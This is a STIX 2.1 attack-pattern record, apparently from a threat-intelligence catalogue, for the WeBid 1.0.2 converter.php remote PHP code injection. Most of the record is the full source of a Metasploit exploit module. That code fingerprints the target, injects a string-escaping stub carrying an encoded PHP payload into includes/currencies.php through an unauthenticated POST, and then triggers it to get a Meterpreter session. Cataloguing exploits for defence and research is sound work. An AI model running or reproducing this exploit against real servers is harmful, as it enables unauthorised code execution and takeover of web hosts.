{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fe8ab4b2-7c93-4a57-8e67-8c3fd1aed3e3",
    "created": "2024-08-14T17:04:38.552345Z",
    "modified": "2024-08-14T17:04:38.552349Z",
    "name": "WeBid converter.php Remote PHP Code Injection",
    "description": " This module exploits a vulnerability found in WeBid version 1.0.2. By abusing the converter.php file, a malicious user can inject PHP code in the includes/currencies.php script without any authentication, which results in arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webid_converter.rb",
            "external_id": "webid_converter.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.webidsupport.com/forums/showthread.php?3892"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WeBid converter.php Remote PHP Code Injection',\n        'Description' => %q{\n          This module exploits a vulnerability found in WeBid version 1.0.2.\n          By abusing the converter.php file, a malicious user can inject PHP code\n          in the includes/currencies.php script without any authentication, which\n          results in arbitrary code execution.\n        },\n        'Author' => [\n          'EgiX', # Vulnerability Discovery, PoC\n          'juan vazquez' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'OSVDB', '73609' ],\n          [ 'EDB', '17487' ],\n          [ 'URL', 'http://www.webidsupport.com/forums/showthread.php?3892' ]\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Payload' => {\n        },\n        'DisclosureDate' => '2011-07-05',\n        'Targets' => [\n          [ 'WeBid 1.0.2 / Ubuntu', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_delete_file\n              stdapi_fs_getwd\n              stdapi_fs_search\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to WeBid', '/WeBid'])\n      ], self.class\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    uri = target_uri.path\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, \"docs/changes.txt\")\n    })\n\n    if res and res.code == 200 and res.body =~ /1\\.0\\.2 \\- 17\\/01\\/11/\n      return Exploit::CheckCode::Appears\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri + \"converter.php\"\n    })\n\n    if res and res.code == 200 and res.body =~ /WeBId.*CURRENCY CONVERTER/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(client)\n    peer = \"#{client.peerhost}:#{client.peerport}\"\n\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The currencies.php won't be restored automatically.\")\n      return\n    end\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    # Original currencies.php file\n    currencies_php = <<-eof\n      <?php\n      $conversionarray[] = '1265375103';\n      $conversionarray[] = array(\n        array('from' => 'GBP', 'to' => 'AED', 'rate' => '')\n      );\n      ?>\n    eof\n    currencies_php = currencies_php.gsub(/^ {6}/, '')\n\n    pwd = client.fs.dir.pwd\n    print_status(\"Searching currencies.php file from #{pwd}\")\n\n    res = client.fs.file.search(nil, \"currencies.php\", true, -1)\n    res.each do |hit|\n      filename = \"#{hit['path']}/#{hit['name']}\"\n      print_warning(\"Restoring #{filename}\")\n      client.fs.file.rm(filename)\n      fd = client.fs.file.new(filename, \"wb\")\n      fd.write(currencies_php)\n      fd.close\n    end\n\n    print_status(\"Cleanup finished\")\n  end\n\n  def exploit\n    uri = target_uri.path\n    uri << '/' if uri[-1, 1] != '/'\n    peer = \"#{rhost}:#{rport}\"\n\n    stub = \"\\0'));#{payload.encoded}?>\"\n\n    print_status(\"Injecting the PHP payload\")\n\n    response = send_request_cgi({\n      'uri' => normalize_uri(uri, \"converter.php\"),\n      'method' => \"POST\",\n      'vars_post' => {\n        \"action\" => \"convert\",\n        \"from\" => \"USD\",\n        \"to\" => stub\n      }\n    })\n\n    if response and response.code != 200\n      print_error(\"Server returned non-200 status code (#{response.code})\")\n      return\n    end\n\n    print_status(\"Executing the PHP payload\")\n\n    timeout = 0.01\n    response = send_request_cgi({\n      'uri' => normalize_uri(uri, \"includes/currencies.php\"),\n      'method' => \"GET\",\n      'headers' => {\n        'Connection' => \"close\",\n      }\n    }, timeout)\n\n    if response and response.code != 200\n      print_error(\"Server returned non-200 status code (#{response.code})\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-05",
    "x_mitre_platforms": [
        "['php']"
    ]
}